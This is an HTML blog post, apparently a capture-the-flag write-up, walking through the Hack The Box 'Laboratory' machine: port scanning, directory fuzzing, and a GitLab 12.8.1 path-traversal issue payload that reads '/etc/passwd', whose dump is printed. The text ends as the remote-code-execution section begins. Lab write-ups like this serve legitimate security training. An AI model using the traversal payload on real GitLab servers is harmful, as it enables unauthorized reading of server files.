@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 LinuxDifficulty:	EasyPoints:	20Release:	14 Nov 2020IP:	10.10.10.216 User Blood wtflink	00 days, 01 hours, 48 mins, 28 seconds.Root Blood Icebreaker	00 days, 02 hours, 03 mins, 10 seconds">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[laboratory]">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/11/22/laboratory/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	EasyPoints:	20Release:	14 Nov 2020IP:	10.10.10.216 User Blood wtflink	00 days, 01 hours, 48 mins, 28 seconds.Root Blood Icebreaker	00 days, 02 hours, 03 mins, 10 seconds">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb122.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb123.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb124.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb125.jpg">
+<meta property="article:published_time" content="2020-11-22T09:58:57.000Z">
+<meta property="article:modified_time" content="2021-04-23T15:32:47.004Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb122.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/11/22/laboratory/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/11/22/laboratory/","path":"2020/11/22/laboratory/","title":"Hack-The-Box-walkthrough[laboratory]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[laboratory] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Port-80"><span class="nav-number">3.</span> <span class="nav-text">Port 80</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VHOST-git-laboratory-htb"><span class="nav-number">4.</span> <span class="nav-text">VHOST git.laboratory.htb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Arbitrary-file-read"><span class="nav-number">5.</span> <span class="nav-text">Arbitrary file read</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Got-the-passwd-file"><span class="nav-number">6.</span> <span class="nav-text">Got the passwd file</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE-in-the-gitlab"><span class="nav-number">7.</span> <span class="nav-text">RCE in the gitlab</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Resetting-dexter-password"><span class="nav-number">8.</span> <span class="nav-text">Resetting dexter password</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Login-as-dexter-on-gitlab"><span class="nav-number">9.</span> <span class="nav-text">Login as dexter on gitlab</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Login-as-dexter"><span class="nav-number">10.</span> <span class="nav-text">Login as dexter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-to-root"><span class="nav-number">11.</span> <span class="nav-text">Privilege Escalation to root</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Path-Hijacking"><span class="nav-number">12.</span> <span class="nav-text">Path-Hijacking</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">12.1.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Contact-me"><span class="nav-number">12.2.</span> <span class="nav-text">Contact me</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/11/22/laboratory/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[laboratory] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[laboratory]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-11-22 17:58:57" itemprop="dateCreated datePublished" datetime="2020-11-22T17:58:57+08:00">2020-11-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-04-23 23:32:47" itemprop="dateModified" datetime="2021-04-23T23:32:47+08:00">2021-04-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Linux<br>Difficulty:	Easy<br>Points:	20<br>Release:	14 Nov 2020<br>IP:	10.10.10.216</p>
+<p>User Blood wtflink	00 days, 01 hours, 48 mins, 28 seconds.<br>Root Blood Icebreaker	00 days, 02 hours, 03 mins, 10 seconds.</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb122.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/laboratory<span class="comment"># nmap -sV -p- -v --min-rate=10000 laboratory.htb</span></span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.4.41</span><br><span class="line">443/tcp open  ssl/ssl Apache httpd (SSL-only mode)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/laboratory<span class="comment"># nmap -sV -sC -A -v -p 22,80,443 -T4 laboratory.htb</span></span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.4.41</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to https://laboratory.htb/</span><br><span class="line">443/tcp open  ssl/ssl Apache httpd (SSL-only mode)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: The Laboratory</span><br><span class="line">| ssl-cert: Subject: commonName=laboratory.htb</span><br><span class="line">| Subject Alternative Name: DNS:git.laboratory.htb</span><br><span class="line">| Issuer: commonName=laboratory.htb</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 4096</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2020-07-05T10:39:28</span><br><span class="line">| Not valid after:  2024-03-03T10:39:28</span><br><span class="line">| MD5:   2873 91a5 5022 f323 4b95 df98 b61a eb6c</span><br><span class="line">|_SHA-1: 0875 3a7e eef6 8f50 0349 510d 9fbf abc3 c70a a1ca</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (90%), Crestron XPanel control system (89%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.16 (86%), Linux 3.2 (86%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%), Linux 2.6.39 - 3.2 (85%), Infomir MAG-250 set-top box (85%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Uptime guess: 28.570 days (since Sat Oct 24 16:43:41 2020)</span><br><span class="line">Network Distance: 2 hops</span><br></pre></td></tr></table></figure>
+
+<p>there is a new vhost get caught by nmap: git.laboratory.htb</p>
+<h3 id="Port-80"><a href="#Port-80" class="headerlink" title="Port 80"></a>Port 80</h3><p>There is nothing on the webiste other than some usernames</p>
+<p>Fuzzing the dirs<br>I ran wfuzz on the “&#x2F;” and got these results</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/laboratory<span class="comment"># wfuzz -u https://laboratory.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 --hh 7254</span></span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 3.0.1 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: https://laboratory.htb/FUZZ</span></span><br><span class="line"><span class="string">Total requests: 220560</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word     Chars       Payload                                      </span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000000016:   301        9 L      28 W     319 Ch      &quot;images&quot;                                     </span></span><br><span class="line"><span class="string">000000291:   301        9 L      28 W     319 Ch      &quot;assets&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="VHOST-git-laboratory-htb"><a href="#VHOST-git-laboratory-htb" class="headerlink" title="VHOST git.laboratory.htb"></a>VHOST git.laboratory.htb</h3><p>So i added the new vhost i got from the nmap to my &#x2F;etc&#x2F;hosts</p>
+<p>And i can see that Gitlab is hosted on the vhost</p>
+<p>Now i registered myself as lucifer11</p>
+<p>and logged in</p>
+<p>Didn’t see anything good and juicy then i just go to: <span class="exturl" data-url="aHR0cHM6Ly9naXQubGFib3JhdG9yeS5odGIvaGVscA==">https://git.laboratory.htb/help<i class="fa fa-external-link-alt"></i></span></p>
+<p>saw the current version of gitlab installed</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitLab Community Edition 12.8.1</span><br></pre></td></tr></table></figure>
+
+<p>So its 12.8.1 , so i searched a bit about it on google and got so many CVES</p>
+<p>And a hackerone report caught my eyes , it was disclosed few months ago and was about LFI &amp; RCE</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9oYWNrZXJvbmUuY29tL3JlcG9ydHMvODI3MDUy">Arbitrary file read via the UploadsRewriter when moving and issue<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>in this report gitlab team mentioned that they will release the 12.9.1 so i was pretty sure it was on 12.8.1</p>
+<h3 id="Arbitrary-file-read"><a href="#Arbitrary-file-read" class="headerlink" title="Arbitrary file read"></a>Arbitrary file read</h3><p>So as the First part of report is Arbitrary file read so i am gonna test if its vulnerable or not…</p>
+<ul>
+<li>Made two repos</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test1</span><br><span class="line">test2</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Opened an issue with the following description in test1</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Move the issue to the test2 repo</p>
+</li>
+<li><p>Download and read the file</p>
+</li>
+</ul>
+<h3 id="Got-the-passwd-file"><a href="#Got-the-passwd-file" class="headerlink" title="Got the passwd file"></a>Got the passwd file</h3><p>If i click and download the passwd file its the actually &#x2F;etc&#x2F;passwd file</p>
+<p>passwd</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/laboratory<span class="comment"># cat passwd </span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">_apt:x:104:65534::/nonexistent:/bin/false</span><br><span class="line">sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">git:x:998:998::/var/opt/gitlab:/bin/sh</span><br><span class="line">gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false</span><br><span class="line">gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false</span><br><span class="line">gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh</span><br><span class="line">mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh</span><br><span class="line">registry:x:993:993::/var/opt/gitlab/registry:/bin/sh</span><br><span class="line">gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh</span><br><span class="line">gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="RCE-in-the-gitlab"><a href="#RCE-in-the-gitlab" class="headerlink" title="RCE in the gitlab"></a>RCE in the gitlab</h3><p>Now i can that i can read the files on the server so i can perform the RCE as mentioned in the report</p>
+<ul>
+<li>Marshalled payload</li>
+</ul>
+<p>I need to make a Marshalled payload with the help of github-rails console</p>
